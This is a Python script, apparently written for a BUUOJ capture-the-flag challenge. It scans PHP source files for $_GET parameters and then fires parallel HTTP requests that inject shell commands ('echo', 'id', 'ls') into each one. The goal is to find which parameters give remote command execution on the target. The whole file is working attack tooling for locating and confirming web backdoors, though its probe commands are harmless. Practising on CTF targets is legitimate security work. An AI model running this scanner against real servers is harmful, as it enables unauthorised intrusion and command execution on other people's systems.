import requests
import os
import re
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

BASE_URL = "http://f7e37a03-c461-4d7f-bd04-a85e1baff6b5.node5.buuoj.cn:81"

# Extract all potential backdoor parameters from all files
def extract_params():
    params = set()
    for filename in os.listdir('src'):
        if not filename.endswith('.php'):
            continue
        filepath = os.path.join('src', filename)
        with open(filepath, 'r', errors='ignore') as f:
            content = f.read()
        
        # Find all $_GET parameters used in dangerous contexts
        matches = re.findall(r"\$_GET\['([^']+)'\]", content)
        for m in matches:
            params.add((filename, m))
    
    return list(params)

def test_backdoor(filename, param):
    url = f"{BASE_URL}/{filename}"
    
    # Test with a simple echo command
    test_payloads = [
        ("echo%20MARKER12345", "MARKER12345"),
        ("id", "uid="),
        ("ls", ".php"),
    ]
    
    for payload, marker in test_payloads:
        try:
            resp = requests.get(url, params={param: payload}, timeout=5)
            if marker in resp.text:
                return True, param, payload, resp.text[:200]
        except:
            pass
    
    return False, param, None, None

params = extract_params()
print(f"Testing {len(params)} potential backdoors...")

# Test in parallel
found = []
with ThreadPoolExecutor(max_workers=20) as executor:
    futures = {executor.submit(test_backdoor, filename, param): (filename, param) for filename, param in params[:500]}
    for future in as_completed(futures):
        filename, param = futures[future]
        success, param, payload, result = future.result()
        if success:
            print(f"FOUND: {filename}?{param}={payload}")
            found.append((filename, param, payload))

print(f"\nFound {len(found)} working backdoors")
for f in found:
    print(f)
